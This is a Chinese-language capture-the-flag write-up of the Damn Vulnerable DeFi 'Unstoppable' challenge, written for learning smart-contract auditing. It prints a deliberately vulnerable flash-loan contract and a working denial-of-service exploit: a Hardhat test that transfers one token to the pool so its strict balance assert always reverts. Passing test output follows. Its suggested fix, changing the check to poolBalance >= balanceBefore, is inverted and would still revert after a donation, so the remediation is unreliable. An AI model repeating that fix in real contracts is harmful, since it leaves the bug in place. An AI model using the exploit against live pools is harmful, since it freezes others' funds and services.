[Damn Vulnerable DeFi](https://damnvulnerabledefi.xyz/) 是一個模擬駭客攻擊的遊戲，通過練習可以增加我們對於合約弱點的敏銳度、學習站在審計員的角度審查合約的漏洞。

![https://i.imgur.com/YmWEAHb.png](https://i.imgur.com/YmWEAHb.png)

# 🪙 Challenge #1 - Unstoppable 勢不可擋

裡面有一個借貸池用有幾百萬顆 DVT tokens，而且免費提供閃電貸的服務。我們一開始有 **100 顆 DVT** 可以用，目標是要想辦法攻擊借貸池，讓這個池子**沒辦法再提供 [****Flash Loan**** 閃電貸](https://www.notion.so/Flash-Loan-aaf6168be4bc4eca84d805e99730223c) 的服務**。

- [See the contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.2.0/contracts/unstoppable)
- [Complete the challenge](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.2.0/test/unstoppable/unstoppable.challenge.js)

## 思考切入點

- 有什麼資源可以用？ 100 顆 DVT
- 什麼樣的狀況下 `UnstoppableLender` 會沒有辦法提供服務？flashLoan 有什麼條件？我們要可以改變他哪些條件可以讓 [flashLoan](https://www.notion.so/Flash-Loan-aaf6168be4bc4eca84d805e99730223c) revert？

## 合約研讀：尋找攻擊點

- 仔細看我們會發現總共有以下幾的地方有可能 revert，一一查看就會發現只有 3️⃣ 讓 damnValuableToken 的量跟 poolBalance 不一致，是最簡單的攻擊點。我們可以透過主動轉錢給 UnstoppableLender 讓他的實際擁有量跟紀錄量不一樣。

```solidity
function flashLoan(uint256 borrowAmount) external nonReentrant {
                // 1️⃣：參數，無法控制
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
                // 2️⃣：可以想辦法把 damnValuableToken 的量少到無法借出，但在這個案例中我們沒辦法做到
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

                // 3️⃣ 😈 讓 damnValuableToken 的量跟 poolBalance 不一致，💡確實可以成為攻擊點。
        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore);

        damnValuableToken.transfer(msg.sender, borrowAmount);

        IReceiver(msg.sender).receiveTokens(
            address(damnValuableToken),
            borrowAmount
        );

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
                // 4️⃣ 使用者還錢與否無法控制
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
```

## 實現攻擊

### 攻擊點

- 轉錢操控 Balance， 主動轉錢給 UnstoppableLender 讓他的實際擁有量跟紀錄量不一樣。這樣 `assert(poolBalance == balanceBefore)` 永遠過不了。
- `yarn run unstoppable` 之後就可以發現通過拉 ✨

```solidity
it('Exploit', async function () {
        // 主動轉錢讓 poolBalance !== balanceBefore
        await this.token.transfer(this.pool.address, 1);
    });
```

^6d4bd0

```solidity
[Challenge] Unstoppable
    ✓ Exploit

  1 passing (1s)

✨  Done in 3.78s.
```

## 🔧 弱點總結 & 修改方式

這題基本上是因為錯誤 [****Flash Loan**** 閃電貸](https://www.notion.so/Flash-Loan-aaf6168be4bc4eca84d805e99730223c)  依賴外部可控的條件判斷邏輯，導致無法提供服務，屬於邏輯錯誤的 [阻擋攻擊](https://www.notion.so/0e024713109c42bf899a9815511a0a7c) 、 [操弄依變因攻擊](https://www.notion.so/2a0407b1936b4540a1b45c930e346336)  類型，因為有一行 `assert(poolBalance == balanceBefore)`只要有人多轉了一筆錢造成`poolBalance != balanceBefore` flashloan 的服務就直接報廢掉，而且因為沒有地方可以取錢出來，所以此錯誤也不能被修正。

弱點： 1. 可操弄邏輯判斷依變因 2. 未限制轉錢對象

攻擊方法： 1. 轉 1 wei 到合約當中 讓 `assert(poolBalance == balanceBefore)` 永遠過不了

改進方法： 1. 可以把 `assert(poolBalance == balanceBefore);` ，變成 `assert(poolBalance >= balanceBefore);` 2. 限定只有 owner 才能轉錢進合約。

## 完整合約

### UnstoppableLender 完整合約

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

interface IReceiver {
    function receiveTokens(address tokenAddress, uint256 amount) external;
}

/**
 * @title UnstoppableLender
 * @author Damn Vulnerable DeFi (<https://damnvulnerabledefi.xyz>)
 */
contract UnstoppableLender is ReentrancyGuard {
    IERC20 public immutable damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress) {
        require(tokenAddress != address(0), "Token address cannot be zero");
        damnValuableToken = IERC20(tokenAddress);
    }

    function depositTokens(uint256 amount) external nonReentrant {
        require(amount > 0, "Must deposit at least one token");
        // Transfer token from sender. Sender must have first approved them.
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function flashLoan(uint256 borrowAmount) external nonReentrant {
        require(borrowAmount > 0, "Must borrow at least one token");

        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        // Ensured by the protocol via the `depositTokens` function
        assert(poolBalance == balanceBefore); // 💡 攻擊點

        damnValuableToken.transfer(msg.sender, borrowAmount);

        IReceiver(msg.sender).receiveTokens(
            address(damnValuableToken),
            borrowAmount
        );

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(
            balanceAfter >= balanceBefore,
            "Flash loan hasn't been paid back"
        );
    }
}
```

### Test 解法完整合約

```jsx
const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Unstoppable', function () {
    let deployer, attacker, someUser;

    // Pool has 1M * 10**18 tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

        [deployer, attacker, someUser] = await ethers.getSigners();

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);

        this.token = await DamnValuableTokenFactory.deploy();
        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);

        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
        await this.pool.depositTokens(TOKENS_IN_POOL);

        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);

         // Show it's possible for someUser to take out a flash loan
         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
         await this.receiverContract.executeFlashLoan(10);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.transfer(this.pool.address, 1);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // It is no longer possible to execute flash loans
        await expect(
            this.receiverContract.executeFlashLoan(10)
        ).to.be.reverted;
    });
});
```

## References

[Damn Vulnerable DeFi](https://damnvulnerabledefi.xyz/)
